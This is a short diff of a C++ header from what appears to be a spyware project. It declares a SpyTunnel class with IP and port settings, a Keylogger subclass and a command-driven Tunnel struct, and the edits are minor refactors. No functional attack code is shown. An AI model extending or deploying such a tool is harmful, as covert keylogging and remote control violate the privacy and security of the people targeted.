@@ -6,7 +6,7 @@
 class SpyTunnel {
 public:
     SpyTunnel() = default;
-    int init(std::string __ip, uint __port, int* p_tunnel_shutdown_fd, int __connection_type);
+    int init(std::string __ip, uint __port, int*& p_tunnel_shutdown_fd, int __connection_type);
     void run();
     void shutdown();
 protected:
@@ -16,8 +16,9 @@ protected:
     int tunnel_socket_;
     ScopedEpollFD tunnel_shutdown_fd_;
     int tunnel_fifo_ = -1;
-
+    void write_fifo_error(const std::string& __msg);
     virtual void spawn_window();
+    pid_t pid_;
 };
 
 class Keylogger : public SpyTunnel {
@@ -31,8 +32,8 @@ struct Tunnel {
     CommandCode command_code_;
     int client_index_;
     SpyTunnel* p_spy_tunnel_;
-    std::thread thread_;
-    int tunnel_shutdown_fd_ = -1;
+    //std::thread thread_;
+    int* p_tunnel_shutdown_fd_;
 
     Tunnel(CommandCode __command_code, int __client_index, SpyTunnel* __p_spy_tunnel);
 };
